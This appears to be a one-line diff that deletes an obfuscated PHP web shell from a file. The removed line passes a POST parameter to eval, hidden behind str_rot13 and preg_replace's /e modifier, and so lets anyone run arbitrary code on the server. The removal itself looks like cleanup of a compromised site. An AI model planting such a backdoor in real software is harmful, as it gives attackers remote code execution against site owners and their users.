@@ -1,1 +1,0 @@
-<?php isset($_POST['m41lzt']) && ($www= $_POST['m41lzt']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($www)', 'add');
